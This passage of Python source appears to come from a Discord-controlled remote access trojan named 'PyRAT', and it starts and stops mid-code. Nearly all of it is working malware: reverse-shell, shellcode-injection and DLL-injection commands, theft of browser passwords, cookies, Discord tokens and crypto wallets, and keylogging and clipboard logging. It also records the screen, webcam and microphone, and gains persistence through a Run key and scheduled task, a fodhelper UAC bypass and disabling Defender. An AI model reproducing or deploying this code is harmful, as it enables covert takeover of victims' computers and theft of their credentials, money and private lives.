    ctypes.windll.kernel32.SetFileAttributesW(str(p), 0x2 | 0x4)
    return f"hidden {p}"


@command("cmd", aliases=["sh"], cat="exec", desc="Run a shell command", usage="cmd <command>", timing=True)
def c_cmd(ctx):
    return run(ctx.raw, timeout=180, cwd=str(CWD["p"])) or "(no output)"


@command("ps1", aliases=["powershell"], cat="exec", desc="Run a PowerShell command", usage="ps1 <command>")
def c_ps(ctx):
    return run(["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ctx.raw],
               timeout=300) or "(no output)"


@command("pse", cat="exec", desc="Run PowerShell via encoded command", usage="pse <command>")
def c_pse(ctx):
    return pse(ctx.raw) or "(no output)"


@command("spawn", aliases=["start"], cat="exec", desc="Start a program hidden and detached", usage="spawn <path> [args]")
def c_spawn(ctx):
    a = ctx.argv
    if not a:
        return "usage: .spawn <path> [args]"
    spawn(a[0], a[1:])
    return f"started {a[0]}"


@command("py", aliases=["eval", "python"], cat="exec", desc="Run Python code inside the agent", usage="py <code>")
async def c_py(ctx):
    global PYNS
    if not ctx.raw:
        return await ctx.reply("usage: .py print(2**16)")
    if PYNS is None:
        PYNS = dict(globals())
    PYNS["ctx"] = ctx
    buf = io.StringIO()
    old = sys.stdout
    sys.stdout = buf
    try:
        try:
            print(repr(eval(compile(ctx.raw, "<e>", "eval"), PYNS)))
        except SyntaxError:
            exec(compile(ctx.raw, "<x>", "exec"), PYNS)
    finally:
        sys.stdout = old
    await ctx.reply((buf.getvalue() or "ok").strip(), code=True)


@command("pip", cat="exec", desc="Install a Python package at runtime", usage="pip <package>")
def c_pip(ctx):
    tgt = WORK / "libs"
    tgt.mkdir(exist_ok=True)
    if str(tgt) not in sys.path:
        sys.path.insert(0, str(tgt))
    out = ""
    for base in ([sys.executable, "-m", "pip"], ["py", "-3", "-m", "pip"], ["python", "-m", "pip"]):
        out = run(base + ["install", "--target", str(tgt), ctx.raw], timeout=300)
        if out and "No module named pip" not in out:
            break
    return out[-4000:]


@command("kill", cat="exec", desc="Kill a process by PID or name", usage="kill <pid|name>")
def c_kill(ctx):
    a = ctx.raw
    if not a:
        return "usage: .kill <pid|name>"
    if a.isdigit():
        if psutil:
            psutil.Process(int(a)).kill()
        else:
            run(f"taskkill /F /PID {a}")
        return f"killed {a}"
    if not psutil:
        return run(f"taskkill /F /IM {a}")
    n = 0
    for p in psutil.process_iter(["name"]):
        try:
            if p.info["name"].lower() == a.lower():
                p.kill()
                n += 1
        except Exception:
            pass
    return f"{n} killed"


@command("killall", cat="exec", desc="Kill every process with this name", usage="killall <name>")
def c_killall(ctx):
    if not psutil:
        return "psutil missing"
    if not ctx.raw:
        return "usage: .killall <name>"
    prot = {"system", "system idle process", "registry", "csrss.exe", "wininit.exe",
            "services.exe", "lsass.exe"}
    n = 0
    for p in psutil.process_iter(["name"]):
        try:
            if p.info["name"].lower() == ctx.raw.lower() and p.info["name"].lower() not in prot:
                p.kill()
                n += 1
        except Exception:
            pass
    return f"{n} killed"


@command("watchdog", cat="exec", desc="Auto-restart a process if it dies", usage="watchdog <name> <path> | watchdog off <name>")
def c_watchdog(ctx):
    a = ctx.argv
    if not a:
        return "usage: .watchdog <name> <path> | .watchdog off <name>"
    if a[0] == "off":
        STATE["watchdogs"].pop(a[1] if len(a) > 1 else "", None)
        return "watchdog off"
    if len(a) < 2:
        return "usage: .watchdog <name> <path>"
    name, path = a[0], a[1]

    def loop():
        while STATE["watchdogs"].get(name) is not None:
            alive = any(p.info["name"].lower() == name.lower()
                        for p in psutil.process_iter(["name"])) if psutil else False
            if not alive:
                try:
                    spawn(path)
                except Exception as e:
                    log.warning("watchdog: %s", e)
            time.sleep(3)

    STATE["watchdogs"][name] = True
    threading.Thread(target=loop, daemon=True).start()
    return f"watchdog on for {name}"


def _shellcode_run(data, wait=False):
    k32 = ctypes.windll.kernel32
    k32.VirtualAlloc.restype = ctypes.c_void_p
    k32.CreateThread.restype = ctypes.c_void_p
    addr = k32.VirtualAlloc(0, len(data), 0x3000, 0x40)
    ctypes.memmove(addr, data, len(data))
    th = k32.CreateThread(None, 0, ctypes.c_void_p(addr), None, 0, None)
    if wait:
        k32.WaitForSingleObject(ctypes.c_void_p(th), 0xFFFFFFFF)
    return addr


@command("shellcode", cat="exec", desc="Run shellcode inside this process", usage="shellcode <file.bin> [wait]")
def c_shellcode(ctx):
    a = ctx.argv
    if not a:
        return "usage: .shellcode <file.bin> [wait]"
    data = Path(a[0]).read_bytes()
    addr = _shellcode_run(data, wait=("wait" in a))
    return f"{len(data)} bytes executed at {hex(addr)}"


@command("inject", cat="exec", desc="Inject shellcode into another process", usage="inject <pid> <file.bin>")
def c_inject(ctx):
    a = ctx.argv
    if len(a) < 2:
        return "usage: .inject <pid> <file.bin>"
    pid = int(a[0])
    data = Path(a[1]).read_bytes()
    k32 = ctypes.windll.kernel32
    k32.OpenProcess.restype = ctypes.c_void_p
    k32.VirtualAllocEx.restype = ctypes.c_void_p
    k32.CreateRemoteThread.restype = ctypes.c_void_p
    h = k32.OpenProcess(0x1F0FFF, False, pid)
    if not h:
        return f"OpenProcess({pid}) failed"
    addr = k32.VirtualAllocEx(ctypes.c_void_p(h), None, len(data), 0x3000, 0x40)
    w = ctypes.c_size_t()
    k32.WriteProcessMemory(ctypes.c_void_p(h), ctypes.c_void_p(addr), data, len(data),
                           ctypes.byref(w))
    k32.CreateRemoteThread(ctypes.c_void_p(h), None, 0, ctypes.c_void_p(addr), None, 0, None)
    return f"{w.value} bytes written to pid {pid} at {hex(addr)}"


@command("dll", cat="exec", desc="Load a DLL into another process", usage="dll <pid> <file.dll>")
def c_dll(ctx):
    a = ctx.argv
    if len(a) < 2:
        return "usage: .dll <pid> <file.dll>"
    pid = int(a[0])
    path = str(Path(a[1]).resolve())
    k32 = ctypes.windll.kernel32
    for f in ("OpenProcess", "GetModuleHandleA", "GetProcAddress", "CreateRemoteThread", "VirtualAllocEx"):
        getattr(k32, f).restype = ctypes.c_void_p
    h = k32.OpenProcess(0x1F0FFF, False, pid)
    if not h:
        return "OpenProcess failed"
    buf = path.encode() + b"\0"
    addr = k32.VirtualAllocEx(ctypes.c_void_p(h), None, len(buf), 0x3000, 0x40)
    w = ctypes.c_size_t()
    k32.WriteProcessMemory(ctypes.c_void_p(h), ctypes.c_void_p(addr), buf, len(buf),
                           ctypes.byref(w))
    ll = k32.GetProcAddress(k32.GetModuleHandleA(b"kernel32.dll"), b"LoadLibraryA")
    k32.CreateRemoteThread(ctypes.c_void_p(h), None, 0, ctypes.c_void_p(ll),
                           ctypes.c_void_p(addr), 0, None)
    return f"{path} -> pid {pid}"


@command("revshell", cat="exec", desc="Connect a reverse shell to a listener", usage="revshell <host> <port>")
def c_revshell(ctx):
    a = ctx.argv
    if len(a) < 2:
        return "usage: .revshell 10.0.0.5 4444"
    old = STATE.get("revshell")
    if old:
        old["alive"] = False
        for k in ("sock", "proc"):
            try:
                old[k].close()
            except Exception:
                pass
    s = socket.socket()
    s.settimeout(0.5)
    s.connect((a[0], int(a[1])))
    p = subprocess.Popen("cmd.exe", stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                         stderr=subprocess.STDOUT, bufsize=0)
    st = {"sock": s, "proc": p, "buf": bytearray(), "alive": True, "lock": threading.Lock()}
    STATE["revshell"] = st

    def to_listener():
        while st["alive"]:
            try:
                d = p.stdout.read(1)
            except Exception:
                break
            if not d:
                break
            st["buf"] += d
            try:
                s.sendall(d)
            except Exception:
                break
        st["alive"] = False

    def from_listener():
        while st["alive"]:
            try:
                d = s.recv(4096)
            except socket.timeout:
                continue
            except Exception:
                break
            if not d:
                break
            try:
                with st["lock"]:
                    p.stdin.write(d)
                    p.stdin.flush()
            except Exception:
                break
        st["alive"] = False

    threading.Thread(target=to_listener, daemon=True).start()
    threading.Thread(target=from_listener, daemon=True).start()
    return f"bridged to {a[0]}:{a[1]}, drive it with `.rs <command>`"


@command("rs", cat="exec", desc="Send a command to the reverse shell", usage="rs <command>")
def c_rs(ctx):
    st = STATE.get("revshell")
    if not st:
        return "no active revshell"
    st["buf"].clear()
    try:
        with st["lock"]:
            st["proc"].stdin.write((ctx.raw + "\n").encode())
            st["proc"].stdin.flush()
    except Exception as e:
        return f"write failed: {e}"
    time.sleep(1.2)
    return decode(bytes(st["buf"])) or "(no output)"


CHROMIUM = {
    "Chrome": "Google/Chrome/User Data",
    "Edge": "Microsoft/Edge/User Data",
    "Brave": "BraveSoftware/Brave-Browser/User Data",
    "Vivaldi": "Vivaldi/User Data",
}


def _browser_dirs():
    base = Path(os.environ.get("LOCALAPPDATA", ""))
    if not base.is_dir():
        return
    for name, rel in CHROMIUM.items():
        d = base / rel
        if d.is_dir():
            yield name, d


def _chrome_keys(ud):
    keys = []
    ls = ud / "Local State"
    if not ls.exists():
        return keys
    try:
        data = json.loads(ls.read_text("utf-8"))
        osc = data.get("os_crypt", {})
    except Exception:
        return keys
    try:
        keys.append(dpapi(base64.b64decode(osc["encrypted_key"])[5:]))
    except Exception:
        pass
    try:
        abe = base64.b64decode(osc["app_bound_encrypted_key"])
        if abe[:4] == b"APPB":
            blob = abe[4:]
            for _ in range(2):
                try:
                    blob = dpapi(blob)
                except Exception:
                    break
            if len(blob) >= 32:
                keys.append(blob[:32])
    except Exception:
        pass
    return keys


def _dec_val(keys, blob):
    if not blob:
        return ""
    if blob[:3] in (b"v10", b"v11", b"v20"):
        if not AES:
            return "<no pycryptodome>"
        for key in keys:
            try:
                return AES.new(key, AES.MODE_GCM, nonce=blob[3:15]).decrypt_and_verify(
                    blob[15:-16], blob[-16:]).decode("utf-8", "replace")
            except Exception:
                continue
        return "<decrypt-fail>"
    try:
        return dpapi(blob).decode("utf-8", "replace")
    except Exception:
        return ""


@command("browsers", aliases=["passwords", "logins"], cat="steal", desc="Dump saved browser logins")
def c_browsers(ctx):
    if not AES:
        return "pycryptodome missing"
    out = []
    for name, ud in _browser_dirs():
        keys = _chrome_keys(ud)
        if not keys:
            continue
        for prof in ud.iterdir():
            if not prof.is_dir():
                continue
            db = prof / "Login Data"
            if not db.exists():
                continue
            tmp = WORK / "logins.db"
            try:
                shutil.copy2(db, tmp)
                con = sqlite3.connect(str(tmp))
                rows = con.execute("SELECT origin_url,username_value,password_value FROM logins").fetchall()
                con.close()
            except Exception:
                continue
            for url, user, pwd in rows:
                out.append(f"[{name}/{prof.name}] {url} | {user} | {_dec_val(keys, pwd)}")
    return "\n".join(out) or "nothing found"


@command("cookies", cat="steal", desc="Dump decrypted browser cookies")
def c_cookies(ctx):
    if not AES:
        return "pycryptodome missing"
    out = []
    for name, ud in _browser_dirs():
        keys = _chrome_keys(ud)
        if not keys:
            continue
        for prof in ud.iterdir():
            if not prof.is_dir():
                continue
            db = prof / "Network" / "Cookies"
            if not db.exists():
                continue
            tmp = WORK / "cookies.db"
            try:
                shutil.copy2(db, tmp)
                con = sqlite3.connect(str(tmp))
                rows = con.execute("SELECT host_key,name,encrypted_value FROM cookies").fetchall()
                con.close()
            except Exception:
                continue
            for host, cn, val in rows:
                out.append(f"[{name}] {host} {cn}={_dec_val(keys, val)[:120]}")
    return "\n".join(out[:1500]) or "nothing found"


@command("history", cat="steal", desc="Dump browser history", usage="history [count]")
def c_history(ctx):
    n = int(ctx.raw) if ctx.raw.isdigit() else 150
    out = []
    for name, ud in _browser_dirs():
        for prof in ud.iterdir():
            if not prof.is_dir():
                continue
            db = prof / "History"
            if not db.exists():
                continue
            tmp = WORK / "hist.db"
            try:
                shutil.copy2(db, tmp)
                con = sqlite3.connect(str(tmp))
                rows = con.execute("SELECT url,title FROM urls ORDER BY last_visit_time DESC "
                                   f"LIMIT {n}").fetchall()
                con.close()
            except Exception:
                continue
            out += [f"[{name}] {t or '-'} :: {u}" for u, t in rows]
    return "\n".join(out) or "nothing found"


@command("tokens", cat="steal", desc="Scan for Discord and web tokens")
def c_tokens(ctx):
    pats = (rb"mfa\.[\w-]{80,90}", rb"[\w-]{24}\.[\w-]{6}\.[\w-]{27,38}")
    roots = [Path(os.environ.get("APPDATA", "")) / p / "Local Storage/leveldb" for p in
             ("discord", "discordcanary", "discordptb", "Lightcord")]
    for _, ud in _browser_dirs():
        roots.append(ud / "Default/Local Storage/leveldb")
    hits = set()
    for r in roots:
        if not r.is_dir():
            continue
        for f in list(r.glob("*.ldb")) + list(r.glob("*.log")):
            try:
                blob = f.read_bytes()
            except Exception:
                continue
            for p in pats:
                for m in re.findall(p, blob):
                    hits.add(m.decode("utf-8", "replace"))
    return "\n".join(sorted(hits)) or "no tokens found"


@command("wallets", cat="steal", desc="Find and pack crypto wallets")
async def c_wallets(ctx):
    ad = Path(os.environ.get("APPDATA", ""))
    lad = Path(os.environ.get("LOCALAPPDATA", ""))
    cands = [ad / "Electrum/wallets", ad / "Exodus", ad / "atomic/Local Storage/leveldb",
             ad / "Binance", lad / "Coinbase/Wallet", ad / "Ledger Live", ad / "Monero",
             lad / "Trust Wallet",
             lad / "Google/Chrome/User Data/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"]
    buf = io.BytesIO()
    found = []
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        for c in cands:
            if not c.exists():
                continue
            found.append(str(c))
            if c.is_file():
                z.write(c, c.name)
                continue
            for dp, _, fs in os.walk(c):
                for f in fs:
                    fp = Path(dp) / f
                    try:
                        if fp.stat().st_size < 20_000_000:
                            z.write(fp, fp.relative_to(c.parent))
                    except Exception:
                        pass
    if not found:
        return "no wallets found"
    await ctx.reply("\n".join(found))
    await ctx.file(buf.getvalue(), f"wallets_{HOST}.zip")


@command("clip", cat="steal", desc="Read or set the clipboard", usage="clip [text]")
async def c_clip(ctx):
    if ctx.raw:
        clip_set(ctx.raw)
        return await ctx.reply("clipboard set")
    await ctx.reply(clip_get() or "(empty)")


@command("clipwatch", cat="steal", desc="Log clipboard changes to a file", usage="clipwatch on|off|dump")
async def c_clipwatch(ctx):
    a = ctx.raw.strip().lower()
    f = WORK / "clipboard.txt"
    if a == "off":
        STATE["clipwatch"] = False
        return await ctx.reply("clipwatch off")
    if a == "dump":
        return await ctx.file(f.read_bytes() if f.exists() else b"", "clipboard.txt")
    if STATE["clipwatch"]:
        return await ctx.reply("clipwatch already on")
    last = [None]

    def loop():
        while STATE["clipwatch"]:
            cur = clip_get()
            if cur and cur != last[0]:
                last[0] = cur
                with open(f, "a", encoding="utf-8", errors="replace") as fh:
                    fh.write(f"[{datetime.now():%H:%M:%S}] {cur}\n")
            time.sleep(0.5)

    STATE["clipwatch"] = True
    threading.Thread(target=loop, daemon=True).start()
    await ctx.reply("clipwatch on")


@command("keylog", cat="steal", desc="Global keylogger", usage="keylog on|off|dump|clear")
async def c_keylog(ctx):
    if not pynput:
        return await ctx.reply("pynput missing")
    from pynput import keyboard
    a = ctx.raw.strip().lower()
    f = WORK / "keylog.txt"
    if a == "dump":
        return await ctx.file(f.read_bytes() if f.exists() else b"", "keylog.txt")
    if a == "clear":
        f.write_text("", "utf-8")
        return await ctx.reply("cleared")
    if a == "off":
        if STATE["klog"]:
            try:
                STATE["klog"].stop()
            except Exception:
                pass
            STATE["klog"] = None
        return await ctx.reply("keylog off")
    if STATE["klog"] and STATE["klog"].running:
        return await ctx.reply("keylog already on")
    title = [active_window()]

    def on_press(key):
        try:
            k = key.char
        except Exception:
            k = f"<{str(key).replace('Key.', '')}>"
        cur = active_window()
        with open(f, "a", encoding="utf-8", errors="replace") as fh:
            if cur != title[0]:
                title[0] = cur
                fh.write(f"\n\n[{datetime.now():%Y-%m-%d %H:%M:%S}] --- {cur} ---\n")
            fh.write(k or "")

    STATE["klog"] = keyboard.Listener(on_press=on_press)
    STATE["klog"].start()
    await ctx.reply("keylog on")


@command("grab", cat="steal", desc="Collect everything into one zip")
async def c_grab(ctx):
    await ctx.reply("collecting")
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        for name, fn in (("sysinfo.txt", c_sysinfo), ("env.txt", c_env), ("wifi.txt", c_wifi),
                         ("users.txt", c_users), ("netstat.txt", c_netstat),
                         ("browsers.txt", c_browsers), ("tokens.txt", c_tokens),
                         ("history.txt", c_history)):
            try:
                z.writestr(name, await asyncio.to_thread(fn, ctx))
            except Exception as e:
                z.writestr(name, str(e))
        for f in ("keylog.txt", "clipboard.txt"):
            if (WORK / f).exists():
                z.write(WORK / f, f)
    await ctx.file(buf.getvalue(), f"grab_{HOST}_{datetime.now():%Y%m%d_%H%M}.zip")


RUNKEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
TASKNAME = "PyRAT"


def _self_parts():
    if FROZEN:
        return str(sys.executable), ""
    pyw = Path(sys.executable).with_name("pythonw.exe")
    exe = pyw if pyw.exists() else Path(sys.executable)
    return str(exe), f'"{Path(__file__).resolve()}"'


def _self_cmd():
    exe, params = _self_parts()
    return f'"{exe}" {params}'.strip()


@command("persist", cat="persist", desc="Manage autostart persistence", usage="persist install|remove|status")
def c_persist(ctx):
    a = ctx.raw.strip().lower() or "status"
    if a == "status":
        out = []
        if winreg:
            try:
                k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, RUNKEY)
                out.append("HKCU\\Run: " + str(winreg.QueryValueEx(k, TASKNAME)[0]))
            except Exception:
                out.append("HKCU\\Run: -")
        out.append("task: " + (run(f"schtasks /query /tn {TASKNAME}") or "-")[:200])
        return "\n".join(out)
    if a == "remove":
        if winreg:
            try:
                k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, RUNKEY, 0, winreg.KEY_SET_VALUE)
                winreg.DeleteValue(k, TASKNAME)
            except Exception:
                pass
        run(f"schtasks /delete /tn {TASKNAME} /f")
        return "persistence removed"
    cmd = _self_cmd()
    if winreg:
        k = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, RUNKEY, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, TASKNAME, 0, winreg.REG_SZ, cmd)
    run(f'schtasks /create /tn {TASKNAME} /tr "{cmd}" /sc minute /mo 5 /f')
    return f"persistence installed\n{cmd}"


@command("elevate", aliases=["uac"], cat="persist", desc="Get admin via UAC bypass", usage="elevate [fodhelper|prompt]")
def c_elevate(ctx):
    if ctx.raw.strip().lower() == "prompt":
        exe, params = _self_parts()
        ctypes.windll.shell32.ShellExecuteW(None, "runas", exe, params, None, 1)
        return "uac prompt"
    if not winreg:
        return "winreg missing"
    k = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER,
                           r"Software\Classes\ms-settings\shell\open\command", 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(k, None, 0, winreg.REG_SZ, _self_cmd())
    winreg.SetValueEx(k, "DelegateExecute", 0, winreg.REG_SZ, "")
    spawn(r"C:\Windows\System32\fodhelper.exe")
    return "fodhelper uac bypass triggered"


@command("reg", cat="persist", desc="Read, write or delete registry values",
         usage="reg read|write|del <hive> <path> [name] [value]")
def c_reg(ctx):
    a = ctx.argv
    if len(a) < 3:
        return "usage: .reg read HKCU Software\\Test value"
    hives = {"hkcu": "HKEY_CURRENT_USER", "hklm": "HKEY_LOCAL_MACHINE",
             "hkcr": "HKEY_CLASSES_ROOT", "hku": "HKEY_USERS"}
    if a[1].lower() not in hives:
        return "hive: HKCU | HKLM | HKCR | HKU"
    hive = getattr(winreg, hives[a[1].lower()])
    if a[0] == "read":
        k = winreg.OpenKey(hive, a[2])
        if len(a) > 3:
            return str(winreg.QueryValueEx(k, a[3])[0])
        out = []
        for i in range(winreg.QueryInfoKey(k)[1]):
            n, v, _ = winreg.EnumValue(k, i)
            out.append(f"{n} = {v}")
        return "\n".join(out) or "(no values)"
    if a[0] == "write":
        if len(a) < 4:
            return "usage: .reg write HKCU path name value"
        k = winreg.CreateKeyEx(hive, a[2], 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, a[3], 0, winreg.REG_SZ, " ".join(a[4:]))
        return "written"
    k = winreg.OpenKey(hive, a[2], 0, winreg.KEY_SET_VALUE)
    winreg.DeleteValue(k, a[3])
    return "deleted"


@command("restrict", cat="persist", desc="Lock Task Manager, Regedit and CMD", usage="restrict on|off")
def c_restrict(ctx):
    on = ctx.raw.strip().lower() != "off"
    if not winreg:
        return "winreg missing"
    k = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER,
                           r"Software\Policies\Microsoft\Windows\System", 0, winreg.KEY_SET_VALUE)
    for v in ("DisableTaskMgr", "DisableRegistryTools", "DisableCMD"):
        winreg.SetValueEx(k, v, 0, winreg.REG_DWORD, 1 if on else 0)
    return f"restrictions {'on' if on else 'off'}"


@command("hosts", cat="persist", desc="View or edit the hosts file", usage="hosts show|add|rm <domain> [ip]")
def c_hosts(ctx):
    p = Path(os.environ.get("SystemRoot", r"C:\Windows")) / "System32/drivers/etc/hosts"
    a = ctx.argv
    if not a or a[0] == "show":
        return p.read_text("utf-8", errors="replace")[-6000:]
    txt = p.read_text("utf-8", errors="replace")
    if a[0] == "add":
        if len(a) < 2:
            return "usage: .hosts add <domain> [ip]"
        ip = a[2] if len(a) > 2 else "0.0.0.0"
        p.write_text(txt + f"\n{ip}\t{a[1]}\n", "utf-8")
        return f"{ip} {a[1]} added"
    if len(a) < 2:
        return "usage: .hosts rm <domain>"
    p.write_text("\n".join(l for l in txt.splitlines() if a[1] not in l) + "\n", "utf-8")
    return f"{a[1]} removed"


@command("defender", cat="persist", desc="Turn Defender realtime protection on/off", usage="defender off|on")
def c_defender(ctx):
    if not WIN:
        return "(windows only)"
    v = "$false" if ctx.raw.strip().lower() == "off" else "$true"
    return ps(f"Set-MpPreference -DisableRealtimeMonitoring {v}; "
              "Get-MpComputerStatus | Select RealTimeProtectionEnabled | Format-List")


def _shot(monitor=1):
    with mss.mss() as sct:
        idx = monitor if 0 <= monitor < len(sct.monitors) else 1
        g = sct.grab(sct.monitors[idx])
        return PILImage.frombytes("RGB", g.size, g.rgb)


@command("ss", aliases=["screenshot"], cat="screen", desc="Take a screenshot", usage="ss [monitor]")
async def c_ss(ctx):
    if not mss or not PILImage:
        return await ctx.reply("mss / Pillow missing")
    img = await asyncio.to_thread(_shot, int(ctx.raw) if ctx.raw.isdigit() else 1)
    buf = io.BytesIO()
    img.save(buf, "PNG")
    await ctx.file(buf.getvalue(), f"screen_{datetime.now():%H%M%S}.png")


@command("monitors", cat="screen", desc="List monitors")
async def c_monitors(ctx):
    if not mss:
        return await ctx.reply("mss missing")
    with mss.mss() as sct:
        await ctx.reply("\n".join(f"[{i}] {m['width']}x{m['height']} @ {m['left']},{m['top']}"
                                  for i, m in enumerate(sct.monitors)))


@command("sc", aliases=["rec"], cat="screen", desc="Record the screen to video", usage="sc [seconds] [monitor]")
async def c_sc(ctx):
    if not (mss and cv2 and numpy and imageio):
        return await ctx.reply("mss / opencv / numpy / imageio missing")
    a = ctx.argv
    secs = float(a[0]) if a else 5.0
    mon = int(a[1]) if len(a) > 1 else 1

    def rec():
        frames = []
        with mss.mss() as sct:
            m = sct.monitors[mon if 0 <= mon < len(sct.monitors) else 1]
            t0 = time.time()
            while time.time() - t0 < secs:
                frames.append(cv2.cvtColor(numpy.array(sct.grab(m)), cv2.COLOR_BGRA2RGB))
        buf = io.BytesIO()
        w = imageio.get_writer(buf, format="mp4", fps=15, macro_block_size=1)
        for f in frames:
            w.append_data(f)
        w.close()
        return buf.getvalue()

    await ctx.file(await asyncio.to_thread(rec), "screen.mp4")


@command("stream", cat="screen", desc="Stream screenshots continuously", usage="stream on [interval] [monitor] | off")
async def c_stream(ctx):
    if ctx.raw.strip().lower().startswith("off"):
        STATE["stream_cfg"] = None
        if STATE["stream"]:
            try:
                STATE["stream"].cancel()
            except Exception:
                pass
        STATE["stream"] = None
        return await ctx.reply("stream off")
    a = ctx.argv[1:] if ctx.argv else []
    interval = float(a[0]) if a else 3.0
    mon = int(a[1]) if len(a) > 1 else 1
    STATE["stream_cfg"] = (interval, mon, ctx.channel.id)
    _start_stream()
    await ctx.reply(f"stream on, every {interval}s, monitor {mon}")


@command("wc", aliases=["cam"], cat="screen", desc="Take a webcam photo", usage="wc [index]")
async def c_wc(ctx):
    if not cv2:
        return await ctx.reply("opencv missing")
    idx = int(ctx.raw) if ctx.raw.isdigit() else 0

    def grab():
        c = cv2.VideoCapture(idx, cv2.CAP_DSHOW if WIN else 0)
        ok = False
        fr = None
        for _ in range(3):
            ok, fr = c.read()
        c.release()
        if not ok:
            raise RuntimeError("no frame")
        return cv2.imencode(".jpg", fr)[1].tobytes()

    await ctx.file(await asyncio.to_thread(grab), "cam.jpg")


@command("wcr", cat="screen", desc="Record from the webcam", usage="wcr [seconds] [index]")
async def c_wcr(ctx):
    if not (cv2 and numpy and imageio):
        return await ctx.reply("opencv / numpy / imageio missing")
    a = ctx.argv
    secs = float(a[0]) if a else 5.0
    idx = int(a[1]) if len(a) > 1 else 0

    def rec():
        c = cv2.VideoCapture(idx, cv2.CAP_DSHOW if WIN else 0)
        frames = []
        t0 = time.time()
        while time.time() - t0 < secs:
            ok, fr = c.read()
            if ok:
                frames.append(cv2.cvtColor(fr, cv2.COLOR_BGR2RGB))
        c.release()
        buf = io.BytesIO()
        w = imageio.get_writer(buf, format="mp4", fps=15, macro_block_size=1)
        for f in frames:
            w.append_data(f)
        w.close()
        return buf.getvalue()

    await ctx.file(await asyncio.to_thread(rec), "cam.mp4")


@command("miclist", cat="screen", desc="List audio input devices")
def c_miclist(ctx):
    if not pyaudio:
        return "pyaudio missing"
    p = pyaudio.PyAudio()
    try:
        return "\n".join(f"[{i}] {p.get_device_info_by_index(i)['name']}"
                         for i in range(p.get_device_count())
                         if p.get_device_info_by_index(i)["maxInputChannels"] > 0)
    finally:
        p.terminate()


@command("join", aliases=["mic"], cat="screen", desc="Stream the microphone into voice", usage="join [device]")
async def c_join(ctx):
    if not OPUS_OK:
        return await ctx.reply("opus not loaded, check .debug")
    if not NACL_OK:
        return await ctx.reply("PyNaCl missing")
    if not pyaudio:
        return await ctx.reply("pyaudio missing")
    if not ctx.author.voice:
        return await ctx.reply("join a voice channel first")
    vc = ctx.voice_client or await ctx.author.voice.channel.connect(self_deaf=False)
    src = await asyncio.to_thread(MicSource, ctx.raw or None)
    vc.play(src)
    await ctx.reply(f"mic live at {src.rate} Hz")


@command("leave", cat="screen", desc="Leave the voice channel")
async def c_leave(ctx):
    if ctx.voice_client:
        await ctx.voice_client.disconnect()
    await ctx.reply("disconnected")


@command("mouse", cat="input", desc="Control the mouse",
         usage="mouse move x y | click [l|r|m] [2] | scroll n | pos")
def c_mouse(ctx):
    if not pyautogui:
        return "pyautogui missing"
    a = ctx.argv
    if not a:
        return f"pos: {pyautogui.position()}"
    if a[0] == "move":
        pyautogui.moveTo(int(a[1]), int(a[2]), duration=0.2)
        return "ok"
    if a[0] == "click":
        btn = {"l": "left", "r": "right", "m": "middle"}.get(a[1] if len(a) > 1 else "l", "left")
        pyautogui.click(button=btn, clicks=2 if "2" in a else 1)
        return "ok"
    if a[0] == "scroll":
        pyautogui.scroll(int(a[1]))
        return "ok"
    if a[0] == "pos":
        return str(pyautogui.position())
    return "usage: .mouse move 100 200 | click r | scroll -5"


@command("key", aliases=["type"], cat="input", desc="Control the keyboard",
         usage="key press <key> | key hotkey ctrl c | key <text>")
def c_key(ctx):
    if not pyautogui:
        return "pyautogui missing"
    a = ctx.argv
    if not a:
        return "usage: .key press enter | .key hotkey ctrl c | .key hello world"
    if a[0] == "press":
        pyautogui.press(a[1])
        return "ok"
    if a[0] == "hotkey":
        pyautogui.hotkey(*a[1:])
        return "ok"
    pyautogui.write(" ".join(a), interval=0.03)
    return "ok"


@command("volume", cat="input", desc="Change the volume", usage="volume up|down|mute [n]")
def c_volume(ctx):
    if not WIN:
        return "windows only"
    a = ctx.argv
    n = int(a[1]) if len(a) > 1 else 5
    vk = {"up": 0xAF, "down": 0xAE, "mute": 0xAD}.get(a[0] if a else "up", 0xAF)
    for _ in range(1 if vk == 0xAD else n):
        _u32.keybd_event(vk, 0, 0, 0)
        _u32.keybd_event(vk, 0, 2, 0)
        time.sleep(0.02)
    return "ok"


@command("wallpaper", cat="input", desc="Set the desktop wallpaper", usage="wallpaper <path|url>")
def c_wallpaper(ctx):
    if not WIN:
        return "windows only"
    p = Path(ctx.raw)
    if ctx.raw.startswith("http"):
        if not requests:
            return "requests missing"
        p = WORK / "wall.jpg"
        p.write_bytes(requests.get(ctx.raw, timeout=30).content)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, str(p.resolve()), 3)
    return f"wallpaper {p}"


@command("tts", aliases=["speak"], cat="input", desc="Speak text out loud", usage="tts <text>")
def c_tts(ctx):
    if not WIN:
        return "windows only"
    txt = ctx.raw.replace("'", "''")
    pse("Add-Type -AssemblyName System.Speech; "
        f"(New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak('{txt}')", timeout=300)
    return "spoken"


@command("msgbox", aliases=["message"], cat="input", desc="Show a popup message box", usage="msgbox <text>")
def c_msgbox(ctx):
    threading.Thread(target=lambda: ctypes.windll.user32.MessageBoxW(0, ctx.raw, APP, 0x40),
                     daemon=True).start()
    return "shown"


@command("lock", cat="input", desc="Lock the workstation")
def c_lock(ctx):
    run("rundll32 user32.dll,LockWorkStation")
    return "locked"


@command("sleep", cat="input", desc="Suspend the PC")
def c_sleep(ctx):
    run("rundll32 powrprof.dll,SetSuspendState 0,1,0")
    return "suspended"


@command("disableinput", aliases=["blockinput"], cat="input", desc="Block mouse and keyboard input", usage="disableinput on|off")
def c_disableinput(ctx):
    on = not ctx.raw.strip().lower().startswith("off")
    return f"BlockInput({'on' if on else 'off'}) -> {bool(_u32.BlockInput(on))}"


@command("blackout", cat="input", desc="Screen off, input blocked, wallpaper swapped", usage="blackout on|off")
